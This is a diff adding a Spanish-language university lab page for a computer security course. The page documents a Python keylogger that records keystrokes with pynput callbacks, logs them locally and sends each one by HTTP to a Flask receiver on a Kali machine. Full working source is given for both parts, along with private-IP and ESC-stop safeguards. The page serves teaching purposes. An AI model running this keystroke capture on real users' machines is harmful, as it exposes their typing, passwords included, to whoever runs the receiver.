@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Actividad 03: event hooks, callbacks, persistencia temporal y telemetría controlada en laboratorio.">
+  <meta name="theme-color" content="#080b0d">
+  <title>ACT03 // No presiones Esc... todavía</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../styles.css">
+  <link rel="stylesheet" href="actividad.css">
+</head>
+<body>
+  <div class="page-frame activity-page">
+    <header class="site-header">
+      <div class="top-rail">
+        <a class="brand" href="https://cyberpunk.fandom.com/wiki/NetWatch" target="_blank" rel="noopener noreferrer" aria-label="Abrir la wiki de NetWatch">
+          <span class="brand-copy brand-net">NET</span>
+          <span class="brand-lines" aria-hidden="true"><i></i><i></i><i></i><i></i></span>
+          <span class="brand-copy brand-tech">TECH</span>
+        </a>
+        <div class="protocol-title">
+          <span>EVENT HOOK TELEMETRY INTERFACE</span>
+          <small>CONTROLLED LABORATORY // PARTIAL 01</small>
+        </div>
+        <div class="connection-state">
+          <span class="state-dot"></span>
+          <span>LAB NODE ACTIVE</span>
+        </div>
+      </div>
+      <nav class="main-nav" aria-label="Navegación">
+        <a class="nav-item" href="../../index.html"><span>00</span>INICIO</a>
+        <a class="nav-item" href="../index.html"><span>01</span>PARCIAL 01</a>
+        <a class="nav-item active" href="Act02.html"><span>02</span>ACTIVIDAD 03</a>
+      </nav>
+    </header>
+
+    <main>
+      <section class="activity-hero">
+        <div class="vector-corner vector-corner-tl" aria-hidden="true"><i></i><i></i><i></i></div>
+        <div class="vector-corner vector-corner-br" aria-hidden="true"><i></i><i></i><i></i></div>
+        <div class="ambient-matrix ambient-matrix-a" aria-hidden="true">PRESS 001 22:51:04.215<br>RELEASE 002 22:51:04.292<br>CALLBACK 0x55 ACTIVE<br>LOCAL NET // KALI NODE</div>
+
+        <div class="hero-grid">
+          <div>
+            <p class="activity-kicker">ACTIVITY 03 // EVENT CAPTURE LAB</p>
+            <h1>NO PRESIONES ESC... <span>TODAVÍA</span></h1>
+            <p>
+              Implementación y documentación de un programa basado en event hooks y callbacks que registra eventos de teclado, conserva una asociación temporal y transmite telemetría hacia un receptor local de laboratorio en Kali Linux.
+            </p>
+          </div>
+
+          <aside class="mission-card">
+            <header>MISSION PARAMETERS // ACT03</header>
+            <dl>
+              <div><dt>COURSE</dt><dd>CNO IV – Seguridad Informática</dd></div>
+              <div><dt>ENVIRONMENT</dt><dd>Laboratorio controlado</dd></div>
+              <div><dt>CAPTURE</dt><dd>PRESS / RELEASE</dd></div>
+              <div><dt>PERSISTENCE</dt><dd>Registro local de eventos</dd></div>
+              <div><dt>RECEIVER</dt><dd>Kali Linux en red privada</dd></div>
+              <div><dt>TERMINATION</dt><dd>Tecla ESC</dd></div>
+            </dl>
+          </aside>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>01 // OBJECTIVE BRIEF</h2>
+          <span>MISSION CONTEXT</span>
+        </div>
+
+        <div class="objectives-grid">
+          <article class="text-panel">
+            <p>
+              El objetivo de esta práctica consiste en comprender cómo una aplicación puede reaccionar ante eventos del teclado mediante callbacks, cómo esos eventos pueden conservarse en un registro local y cómo se puede asociar cada uno con una marca temporal para estudiar su orden y separación en el tiempo.
+            </p>
+            <p>
+              La práctica se ejecuta únicamente dentro de un entorno de laboratorio autorizado. El programa no incorpora mecanismos de inicio automático, ocultamiento ni persistencia de ejecución; la única persistencia implementada corresponde al archivo de registro solicitado.
+            </p>
+            <ul class="objective-list">
+              <li>Registrar eventos PRESS y RELEASE mediante callbacks.</li>
+              <li>Guardar cada evento en un archivo local.</li>
+              <li>Asignar identificador, fecha y hora con precisión de milisegundos.</li>
+              <li>Transmitir los eventos hacia una máquina Kali de la red privada.</li>
+              <li>Comprobar el comportamiento mediante registros y evidencias.</li>
+            </ul>
+          </article>
+
+          <aside class="requirement-panel">
+            <div class="requirement"><span>01</span><div><strong>PERSISTENCIA DEL REGISTRO</strong><small>registro_teclas.txt</small></div><span class="state">READY</span></div>
+            <div class="requirement"><span>02</span><div><strong>ASOCIACIÓN TEMPORAL</strong><small>YYYY-MM-DD HH:MM:SS.mmm</small></div><span class="state">READY</span></div>
+            <div class="requirement"><span>03</span><div><strong>ENVÍO A KALI LINUX</strong><small>HTTP POST // PRIVATE LAN</small></div><span class="state">READY</span></div>
+            <div class="requirement"><span>04</span><div><strong>DETENCIÓN CONTROLADA</strong><small>Key.esc</small></div><span class="state">READY</span></div>
+          </aside>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>02 // DATA FLOW</h2>
+          <span>CONTROLLED TELEMETRY PATH</span>
+        </div>
+        <div class="flow">
+          <div class="flow-node"><span>NODE A</span><strong>KEYBOARD EVENT</strong><small>Evento generado durante la ejecución autorizada.</small></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><span>CALLBACK</span><strong>PYNPUT LISTENER</strong><small>on_press() / on_release() procesan el evento.</small></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><span>LOCAL</span><strong>EVENT LOG</strong><small>Se escribe timestamp, tipo, ID y tecla en un archivo local.</small></div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node"><span>NODE B</span><strong>KALI RECEIVER</strong><small>Flask recibe JSON mediante HTTP dentro de la red privada.</small></div>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>03 // SOURCE CODE</h2>
+          <span>LAB BUILD</span>
+        </div>
+        <div class="code-switch">
+          <article class="code-panel">
+            <div class="code-head"><span>EMISOR // PYTHON</span><span>emisor_lab.py</span></div>
+            <pre><code>from datetime import datetime
+from pathlib import Path
+from ipaddress import ip_address
+from pynput.keyboard import Key, Listener
+import requests
+
+KALI_IP = &quot;192.168.1.100&quot;
+KALI_PORT = 5000
+LAB_TOKEN = &quot;cambia-este-token&quot;
+
+LOG_FILE = Path(__file__).with_name(&quot;registro_teclas.txt&quot;)
+ENDPOINT = f&quot;http://{KALI_IP}:{KALI_PORT}/telemetry&quot;
+
+event_counter = 0
+
+
+def validar_receptor():
+    try:
+        ip = ip_address(KALI_IP)
+    except ValueError:
+        raise SystemExit(&quot;[ERROR] La dirección configurada no es una IP válida.&quot;)
+
+    if not (ip.is_private or ip.is_loopback):
+        raise SystemExit(&quot;[ERROR] El receptor debe pertenecer a una red privada o localhost.&quot;)
+
+
+def timestamp():
+    return datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)[:-3]
+
+
+def representar_tecla(key):
+    try:
+        return key.char if key.char is not None else &quot;unknown&quot;
+    except AttributeError:
+        return str(key).replace(&quot;Key.&quot;, &quot;&quot;)
+
+
+def guardar_local(evento):
+    linea = (
+        f&quot;{evento[&#x27;timestamp&#x27;]} | &quot;
+        f&quot;{evento[&#x27;type&#x27;]} | &quot;
+        f&quot;{evento[&#x27;id&#x27;]} | &quot;
+        f&quot;{evento[&#x27;key&#x27;]}&quot;
+    )
+
+    with LOG_FILE.open(&quot;a&quot;, encoding=&quot;utf-8&quot;) as archivo:
+        archivo.write(linea + &quot;\n&quot;)
+
+    return linea
+
+
+def enviar_telemetria(evento):
+    try:
+        response = requests.post(
+            ENDPOINT,
+            json=evento,
+            headers={&quot;X-Lab-Token&quot;: LAB_TOKEN},
+            timeout=1.5
+        )
+
+        if response.ok:
+            print(f&quot;[NET] {evento[&#x27;id&#x27;]} transmitido correctamente.&quot;)
+        else:
+            print(f&quot;[NET] {evento[&#x27;id&#x27;]} rechazado. HTTP {response.status_code}.&quot;)
+
+    except requests.RequestException:
+        print(f&quot;[NET] Receptor no disponible. {evento[&#x27;id&#x27;]} permanece en el registro local.&quot;)
+
+
+def registrar_evento(key, tipo):
+    global event_counter
+
+    event_counter += 1
+
+    evento = {
+        &quot;id&quot;: f&quot;evento_{event_counter:03d}&quot;,
+        &quot;timestamp&quot;: timestamp(),
+        &quot;type&quot;: tipo,
+        &quot;key&quot;: representar_tecla(key)
+    }
+
+    print(guardar_local(evento))
+    enviar_telemetria(evento)
+
+
+def on_press(key):
+    registrar_evento(key, &quot;PRESS&quot;)
+
+
+def on_release(key):
+    registrar_evento(key, &quot;RELEASE&quot;)
+
+    if key == Key.esc:
+        print(f&quot;[STOP] ESC detectado. Registro guardado en {LOG_FILE}&quot;)
+        return False
+
+
+validar_receptor()
+
+print(&quot;=&quot; * 64)
+print(&quot;LABORATORIO CONTROLADO // EVENT HOOK TELEMETRY&quot;)
+print(f&quot;LOG LOCAL : {LOG_FILE}&quot;)
+print(f&quot;RECEPTOR  : {ENDPOINT}&quot;)
+print(&quot;DETENER   : ESC&quot;)
+print(&quot;=&quot; * 64)
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+</code></pre>
+          </article>
+          <article class="code-panel">
+            <div class="code-head"><span>RECEPTOR // KALI</span><span>receptor_kali.py</span></div>
+            <pre><code>from datetime import datetime
+from pathlib import Path
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+LAB_TOKEN = &quot;cambia-este-token&quot;
+LOG_FILE = Path(__file__).with_name(&quot;telemetria_recibida.txt&quot;)
+
+
+def timestamp():
+    return datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)[:-3]
+
+
+@app.post(&quot;/telemetry&quot;)
+def telemetry():
+    if request.headers.get(&quot;X-Lab-Token&quot;) != LAB_TOKEN:
+        return jsonify({
+            &quot;status&quot;: &quot;error&quot;,
+            &quot;message&quot;: &quot;token de laboratorio no válido&quot;
+        }), 403
+
+    data = request.get_json(silent=True)
+
+    if not isinstance(data, dict):
+        return jsonify({
+            &quot;status&quot;: &quot;error&quot;,
+            &quot;message&quot;: &quot;se requiere un objeto JSON&quot;
+        }), 400
+
+    required = {&quot;id&quot;, &quot;timestamp&quot;, &quot;type&quot;, &quot;key&quot;}
+
+    if not required.issubset(data):
+        return jsonify({
+            &quot;status&quot;: &quot;error&quot;,
+            &quot;message&quot;: &quot;telemetría incompleta&quot;
+        }), 422
+
+    received_at = timestamp()
+
+    linea = (
+        f&quot;{received_at} | &quot;
+        f&quot;{data[&#x27;timestamp&#x27;]} | &quot;
+        f&quot;{data[&#x27;type&#x27;]} | &quot;
+        f&quot;{data[&#x27;id&#x27;]} | &quot;
+        f&quot;{data[&#x27;key&#x27;]}&quot;
+    )
+
+    print(linea)
+
+    with LOG_FILE.open(&quot;a&quot;, encoding=&quot;utf-8&quot;) as archivo:
+        archivo.write(linea + &quot;\n&quot;)
+
+    return jsonify({
+        &quot;status&quot;: &quot;received&quot;,
+        &quot;event&quot;: data[&quot;id&quot;],
+        &quot;received_at&quot;: received_at
+    }), 200
+
+
+if __name__ == &quot;__main__&quot;:
+    print(&quot;=&quot; * 64)
+    print(&quot;KALI LAB RECEIVER // LISTENING ON TCP 5000&quot;)
+    print(f&quot;LOG: {LOG_FILE}&quot;)
+    print(&quot;=&quot; * 64)
+
+    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=False)
+</code></pre>
+          </article>
+        </div>
+        <div class="download-row">
+          <a class="data-button" href="emisor_lab.py" download>DOWNLOAD // EMISOR</a>
+          <a class="data-button" href="receptor_kali.py" download>DOWNLOAD // RECEPTOR</a>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>04 // TEST PROCEDURE</h2>
+          <span>EXECUTION PLAN</span>
+        </div>
+        <div class="test-grid">
+          <article class="test-step"><span>STEP 01</span><strong>PREPARAR KALI</strong><p>Obtener la IP privada de Kali, configurar el token compartido e iniciar el receptor Flask.</p></article>
+          <article class="test-step"><span>STEP 02</span><strong>CONFIGURAR EMISOR</strong><p>Colocar la IP privada de Kali y el mismo token en el archivo del emisor.</p></article>
+          <article class="test-step"><span>STEP 03</span><strong>GENERAR EVENTOS</strong><p>Ejecutar el emisor, producir una secuencia de prueba y verificar el archivo registro_teclas.txt.</p></article>
+          <article class="test-step"><span>STEP 04</span><strong>VALIDAR RECEPCIÓN</strong><p>Comprobar la llegada de los eventos en Kali y finalizar la captura mediante ESC.</p></article>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>05 // EVIDENCE SLOTS</h2>
+          <span>CAPTURES TO BE ATTACHED</span>
+        </div>
+        <div class="evidence-grid">
+          <div class="evidence-slot"><div><strong>CAPTURE_01</strong><span>EMISOR EN EJECUCIÓN + TIMESTAMPS</span></div></div>
+          <div class="evidence-slot"><div><strong>CAPTURE_02</strong><span>REGISTRO LOCAL GENERADO</span></div></div>
+          <div class="evidence-slot"><div><strong>CAPTURE_03</strong><span>RECEPCIÓN DE TELEMETRÍA EN KALI</span></div></div>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>06 // TECHNICAL ANALYSIS</h2>
+          <span>SECURITY IMPLICATIONS</span>
+        </div>
+        <div class="analysis-grid">
+          <article class="analysis-card"><h3>Event hooks y callbacks</h3><p>El listener funciona como observador de eventos. Cuando ocurre una pulsación o liberación, la biblioteca invoca automáticamente el callback correspondiente. Esto permite desacoplar la generación del evento de la lógica que lo procesa.</p></article>
+          <article class="analysis-card"><h3>Asociación temporal</h3><p>Cada registro contiene una marca temporal y un identificador secuencial. Esta estructura permite reconstruir el orden de los eventos y calcular cuánto tiempo transcurrió entre dos registros consecutivos.</p></article>
+          <article class="analysis-card"><h3>Telemetría de laboratorio</h3><p>El emisor conserva primero una copia local y después intenta transmitir el evento por HTTP. El receptor almacena además el instante de recepción, por lo que puede compararse el momento de captura con el momento de llegada.</p></article>
+          <article class="analysis-card"><h3>Implicaciones de seguridad</h3><p>La misma técnica de captura de entrada puede representar un riesgo cuando se utiliza sin autorización. Por ello la práctica limita el receptor a direcciones privadas o loopback, requiere ejecución visible y se detiene explícitamente con ESC.</p></article>
+        </div>
+      </section>
+
+      <section class="activity-section">
+        <div class="section-title">
+          <h2>07 // REPORT PACKAGE</h2>
+          <span>DELIVERABLE STATUS</span>
+        </div>
+        <div class="presentation-slot">
+          <div><strong>PRESENTACIÓN DE LA ACTIVIDAD</strong><small>Informe con implementación, pruebas, capturas y análisis.</small></div>
+          <span class="pending">PENDING // ATTACH PRESENTATION</span>
+        </div>
+      </section>
+    </main>
+
+    <footer class="site-footer">
+      <div><strong>NET===TECH</strong><span>ACTIVITY NODE // 03</span></div>
+      <div><span>BRUNO LUNA · PACLONK D. MEI</span><span>UPSLP · CNO IV — SEGURIDAD INFORMÁTICA · 2026</span></div>
+      <div class="footer-status"><span class="state-dot"></span><span>CONTROLLED LAB</span></div>
+    </footer>
+  </div>
+</body>
+</html>
